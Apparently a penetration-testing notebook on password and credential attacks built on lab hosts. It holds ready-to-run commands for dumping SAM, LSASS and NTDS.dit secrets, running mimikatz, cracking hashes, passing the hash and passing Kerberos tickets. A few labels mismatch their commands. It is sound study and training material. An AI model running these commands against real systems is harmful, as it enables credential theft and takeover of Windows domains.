# Password Attacks

## Identify Hashes

### 1. Using hashid

<figure><img src="../.gitbook/assets/image (1630).png" alt=""><figcaption></figcaption></figure>

### 2. Using hash-identifier&#x20;

<figure><img src="../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>

### 3. Using Name-That-Hash&#x20;

<figure><img src="../.gitbook/assets/image (1632).png" alt=""><figcaption></figcaption></figure>

## Cracking Protected Files&#x20;

### Hash Convertors&#x20;

{% code overflow="wrap" %}
```bash
locate *2john*
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1634).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted SSH Keys

{% code overflow="wrap" %}
```bash
ssh2john ssh_key > ssh_hash
john ssh_hash --wordlist=<wordlist>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1633).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted Excel File&#x20;

{% code overflow="wrap" %}
```
office2john Confidential.docx > file.hash
john file.hash --wordlist=<wordlist>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1635).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted Drives&#x20;

#### Identify hash&#x20;

<figure><img src="../.gitbook/assets/image (1636).png" alt=""><figcaption></figcaption></figure>

#### Cracking the hash&#x20;

<figure><img src="../.gitbook/assets/image (1637).png" alt=""><figcaption></figcaption></figure>

#### Mounting Encrypted bitlocker drive in Linux&#x20;

{% code overflow="wrap" %}
```
sudo mkdir -p /media/bitlockermount
sudo mkdir -p /media/bitlocker
sudo losetup -f -P Private.vhd
losetup -a
lsblk
sudo dislocker /dev/loop1p1 -ufrancisco -- /media/bitlocker
sudo mount -t ntfs-3g -o loop /media/bitlocker/dislocker-file /media/bitlockermount
ls -l /media/bitlockermount
cat /media/bitlockermount/flag.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>

## Dumping SAM Hashes

### Using Registry Editor

#### 1. Copying Registry Hives

{% code overflow="wrap" %}
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1646).png" alt=""><figcaption></figcaption></figure>

#### 2. Dumping Hashes

1. **Using impacket-secretsdump**

{% code overflow="wrap" %}
```bash
impacket-secretsdump -sam ./sam -security ./security -system ./system LOCAL
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1647).png" alt=""><figcaption></figcaption></figure>



2. **Using samdump2**

{% code overflow="wrap" %}
```bash
samdump2 system sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1648).png" alt=""><figcaption></figcaption></figure>

### **Using pwdump8**

{% code overflow="wrap" %}
```bash
pwdump8.exe
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1651).png" alt=""><figcaption></figcaption></figure>

### Using impacket-secretsdump (best)

{% code overflow="wrap" %}
```bash
impacket-secretsdump arjun@192.168.16.132
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1652).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-PowerDump.ps1

{% code overflow="wrap" %}
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\Invoke-PowerDump.ps1
Invoke-PowerDump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1653).png" alt=""><figcaption></figcaption></figure>

### Using Mimikatz&#x20;

{% code overflow="wrap" %}
```cmd
privilege::debug
token::elevate
lsadump::sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1654).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit&#x20;

1. **Using smart\_hashdump**

{% code overflow="wrap" %}
```bash
use post/windows/gather/smart_hashdump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1655).png" alt=""><figcaption></figcaption></figure>

2. **Using hashdump**&#x20;

{% code overflow="wrap" %}
```bash
use post/windows/gather/hashdump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1656).png" alt=""><figcaption></figcaption></figure>

### Using nxc

{% code overflow="wrap" %}
```bash
netexec smb 192.168.16.132 -u arjun -p 'P@$$w0rd' --sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1657).png" alt=""><figcaption></figcaption></figure>

### Dump LSA (nxc)

{% code overflow="wrap" %}
```bash
netexec smb 192.168.16.132 -u arjun -p 'P@$$w0rd' --lsa
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1658).png" alt=""><figcaption></figcaption></figure>

## Cracking SAM hashes&#x20;

### Using John (JtR)

{% code overflow="wrap" %}
```bash
john --format=NT sam_hashes.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1649).png" alt=""><figcaption></figcaption></figure>

### Using Hashcat&#x20;

{% code overflow="wrap" %}
```bash
hashcat -m 1000 sam.hashes /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1650).png" alt=""><figcaption></figcaption></figure>

## Dumping LSASS Process Memory&#x20;

### Using Task Manager

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

<figure><img src="../.gitbook/assets/image (1659).png" alt=""><figcaption></figcaption></figure>

### Using Rundll32.exe & Comsvcs.dll&#x20;

#### Finding LSASS's PID&#x20;

1. **Using cmd :** `tasklist /svc | findstr lsass`

<figure><img src="../.gitbook/assets/image (1660).png" alt=""><figcaption></figcaption></figure>

2. **Using PowerShell: `Get-Process lsass`**

<figure><img src="../.gitbook/assets/image (1661).png" alt=""><figcaption></figcaption></figure>

#### Creating a dump file using PowerShell&#x20;

**With an elevated PowerShell session, we can issue the following command to create a dump file:**

{% code overflow="wrap" %}
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 736 C:\lsass.dmp full
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1663).png" alt=""><figcaption></figcaption></figure>

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).

### Using Sysinternals ProcDump&#x20;

{% code overflow="wrap" %}
```
# Run as Administrator
procdump.exe -ma lsass.exe lsass.dmp
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1664).png" alt=""><figcaption></figcaption></figure>

## Extracting Credentials from Lsass

### Using pypykatz&#x20;

{% code overflow="wrap" %}
```bash
pypykatz lsa minidump lsass.dmp
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1665).png" alt=""><figcaption></figcaption></figure>

### Using mimikatz (Windows Directly)

{% code overflow="wrap" %}
```
mimikatz.exe 
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1666).png" alt=""><figcaption></figcaption></figure>

### Cracking NT Hash (found in LSASS)

<figure><img src="../.gitbook/assets/image (1668).png" alt=""><figcaption></figcaption></figure>

## Enumerating Credentials Manager&#x20;

### Using cmdkey&#x20;

{% code overflow="wrap" %}
```
cmdkey /list
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1676).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_This thing can also be viewed from the credentials manager in the GUI. and we can change it if we've admin permissions._&#x20;
{% endhint %}

### Use stored credentials

{% code overflow="wrap" %}
```
cmdkey /list
runas /savecred /user:bakasura\backup cmd
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1674).png" alt=""><figcaption></figcaption></figure>

### Extracting credentials with Mimikatz&#x20;

{% code overflow="wrap" %}
```
mimikatz.exe
privilege::debug
sekurlsa::credman
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>

## Attacking Linux Authentication&#x20;

### Dumping auth Files&#x20;

{% code overflow="wrap" %}
```bash
sudo cp /etc/shadow /tmp/shadow.bak
sudo cp /etc/passwd /etc/passwd.bak
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1690).png" alt=""><figcaption></figcaption></figure>

### Identify Hash Types&#x20;

Note that we've two different hash types `yescrypt` and `SHA512`.&#x20;

<figure><img src="../.gitbook/assets/image (1692).png" alt=""><figcaption></figcaption></figure>

### Cracking auth Files&#x20;

{% hint style="info" %}
_Note that we must know the type of hash before cracking it. hashcat doesn't support yescrypt yet._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```bash
john unshadowed.hashes --wordlist=./password.txt --format-crypt
john unshadowed.hashes --show
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1691).png" alt=""><figcaption></figcaption></figure>

## Attacking AD&#x20;

{% hint style="info" %}
_In Active Directory we can't simply use nxc and find valid user id and passwords as there are a lot of group policies and restriction that stops us doing brute forcing stuffs. So we need to create a custom list using username-anarchy tool based on names and identify usernames from active directory using kerbrute._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```bash
./username-anarchy -i names.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1730).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
/kerbrute_linux_amd64 userenum --dc 192.168.16.111 --domain nexploit.local ../usernames.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1731).png" alt=""><figcaption></figcaption></figure>

## Dumping NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a forest. The `.dit` stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

### Using vssadmin

We can use `vssadmin` to create a Volume shadow copy (VSS) of the `C:` drive or any drive that we want.&#x20;

{% code overflow="wrap" %}
```cmd
vssadmin CREATE SHADOW /For=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\users\Administrator\Desktop\NTDS.dit
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>

#### Dumping with impacket-secretsdump&#x20;

{% code overflow="wrap" %}
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>

### Using netexec&#x20;

{% code overflow="wrap" %}
```bash
netexec smb 192.168.16.111 -u Administrator -p 'P@$$w0rd' -M ntdsutil
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1734).png" alt=""><figcaption></figcaption></figure>



## Pass-The-Hash (PtH)

### Using Mimikatz&#x20;

{% hint style="danger" %}
_Note that mimikatz always run in a privileged mode._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:backup /rc4:f9e37e83b83c47a93c2f09f66408631b /domain:. /run:cmd.exe" exit
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1695).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-TheHash&#x20;

{% hint style="danger" %}
_`cmd.exe` output redirection operators (e.g., `>`, `>>`) may create the file but fail to write the command output. The command still executes successfully._
{% endhint %}

{% code overflow="wrap" %}
```powershell
PS C:\Windows\System32\temp\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS C:\Windows\System32\temp\Invoke-TheHash> Invoke-SMBExec -Target 192.168.16.143 -Domain mahisasura -Username bahubali -Hash 5a6e9ae4e4cfebb7539a4c89d52a1ace -Command "powershell -c `"whoami | Out-File C:\Temp\test.txt`"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1696).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1697).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Local Execution</strong></summary>

<figure><img src="../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>

</details>

### Using Impacket&#x20;

#### Using PsExec&#x20;

{% code overflow="wrap" %}
```bash
impacket-psexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1699).png" alt=""><figcaption></figcaption></figure>

#### Using smbexec&#x20;

{% code overflow="wrap" %}
```bash
impacket-smbexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1700).png" alt=""><figcaption></figcaption></figure>

#### Using wmiexec

{% code overflow="wrap" %}
```bash
impacket-wmiexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1701).png" alt=""><figcaption></figcaption></figure>

#### Using atexec

{% code overflow="wrap" %}
```bash
impacket-wmiexec arjun@192.168.16.132 whoami -hashes 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1702).png" alt=""><figcaption></figcaption></figure>

### Using nxc&#x20;

{% code overflow="wrap" %}
```bash
nxc smb 192.168.16.132 --shares -u 'arjun' -d . -H 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1703).png" alt=""><figcaption></figcaption></figure>

### Using evil-winrm

{% code overflow="wrap" %}
```bash
evil-winrm -u arjun -i 192.168.16.132 -H 8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1704).png" alt=""><figcaption></figcaption></figure>

### Using RDP&#x20;

<details>

<summary><strong>Case (Restricted Admin Mode)</strong></summary>

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

<figure><img src="../.gitbook/assets/image (1705).png" alt=""><figcaption></figcaption></figure>

</details>

#### Enable Restricted admin mode&#x20;

{% code overflow="wrap" %}
```bash
impacket-reg arjun@192.168.16.132 add -keyName "HKLM\System\CurrentControlSet\Control\Lsa" -vt REG_DWORD -v DisableRestrictedAdmin -vd 0
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>

#### Pass-the-Hash&#x20;

{% code overflow="wrap" %}
```bash
xfreerdp /v:192.168.16.132 /u:arjun /pth:8846f7eaee8fb117ad06bdd830b7586c
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1707).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>UAC limits</strong> </summary>

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

</details>

## Dump Tickets

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

* Service Ticket (TGS) to allow access to a particular resource.
* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

{% hint style="info" %}
_On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process._

* _That's why dumping with normal cmd gives your ticket only._&#x20;
* _Dumping with administrator privilege gives all tickets of users logged on from the machine._&#x20;
{% endhint %}

### Using Mimikatz

{% code overflow="wrap" %}
```cmd
mimikatz.exe 
privilege::debug 
sekurlsa::tickets /export
exit
dir *.kirbi
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1743).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Observation:**&#x20;

1. _The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory._&#x20;
2. _User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi` are the TGS tickets for specific service._&#x20;
3. _If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account. Other tickets are TGS ticket whereas ticket with `krbtgt` is TGT ticket for that account._&#x20;
{% endhint %}

### Convert .kirbi to Base64 Format

{% code overflow="wrap" %}
```powershell
$file = Get-ChildItem *.kirbi
[Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))

[Convert]::ToBase64String([IO.File]::ReadAllBytes(".\romario.kirbi"))
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1748).png" alt=""><figcaption></figcaption></figure>

### Using Rubeus&#x20;

* `nowrap` is written for easier copy-paste.

{% code overflow="wrap" %}
```cmd
Rubeus.exe dump /nowrap 
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1737).png" alt=""><figcaption></figcaption></figure>

## Pass-the-Ticket (PtT)

### Using Rubeus (OverPass the Hash -> PtT)

* `/ptt` will inject the `romario` ticket into LSASS even though the logon session belongs to the `cjohnson`.

{% code overflow="wrap" %}
```cmd
Rubeus.exe asktgt /domain:nexploit.local /user:romario /rc4:4ba55e3181a42ccd8610dadd0bfa1df9 /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1745).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1746).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_The whoami command gives cjohnson because it looks locally who is logged in and that's cjohnson. But when we used `dir \\DC01\Romario_Share` then it uses the tickets that is injected in the LSASS and thus we're executing things with the context of Romario._&#x20;
{% endhint %}

{% hint style="danger" %}
_No new CMD session is open when you use Rubeus for passing the ticket._&#x20;
{% endhint %}

### Using Rubeus (Using exported ticket)

{% code overflow="wrap" %}
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1747).png" alt=""><figcaption></figcaption></figure>

### Using Rubeus (Base64 format)

{% code overflow="wrap" %}
```powershell
Rubeus.exe ptt /ticket:<base64 ticket>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1749).png" alt=""><figcaption></figcaption></figure>

### Using Mimikatz (Using exported ticket)

{% code overflow="wrap" %}
```
mimikatz.exe
privilege::debug
kerberos::ptt "ticket_location.kirbi"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1750).png" alt=""><figcaption></figcaption></figure>

## Remote Access with Pass the Ticket

{% hint style="info" %}
_Note that you must pass the correct krbtgt ticket for getting PowerShell remoting and that user must have account and should be allowed to login to domain controller._
{% endhint %}

### Using PowerShell Remoting (WinRM)

{% code overflow="wrap" %}
```powershell
Enter-PSSession -ComputerName DC01
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1752).png" alt=""><figcaption></figcaption></figure>

## OverPass the Hash (Pass the Key)

<table><thead><tr><th width="354.79998779296875">Tickets</th><th>Keys</th></tr></thead><tbody><tr><td>Already issued</td><td>Secret material</td></tr><tr><td>Valid until expiration</td><td>Usually valid until password changes</td></tr><tr><td>Used directly to access service tickets (TGS)</td><td>Used to obtain new tickets (TGT)</td></tr><tr><td>Exported as <code>.kirbi</code></td><td>Displayed as hashes/keys</td></tr><tr><td>Stolen ticket is valid until it expires. </td><td>Keys can forge new tickets as per required. Unlimited access. </td></tr></tbody></table>

{% hint style="info" %}
_Rubeus is useful for this technique as it doesn't require administrator privileges for overpassing the hash._&#x20;
{% endhint %}

&#x20;The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).&#x20;

### Mimikatz - Extract Kerberos keys&#x20;

`sekurlsa::ekeys` will show the cryptographic keys currently stored for every Kerberos logon session. _<mark style="color:$danger;">A key can be used to request new tickets.</mark>_&#x20;

{% code overflow="wrap" %}
```cmd
mimikatz.exe 
privilege::debug
sekurlsa::ekeys
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1738).png" alt=""><figcaption></figcaption></figure>

### Using Mimikatz (Get CMD)

{% code overflow="wrap" %}
```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:nexploit.local /user:romario /ntlm:4ba55e3181a42ccd8610dadd0bfa1df9
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1744).png" alt=""><figcaption></figcaption></figure>

### Using Rubeus (Get Ticket)

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.

{% code overflow="wrap" %}
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1740).png" alt=""><figcaption></figcaption></figure>

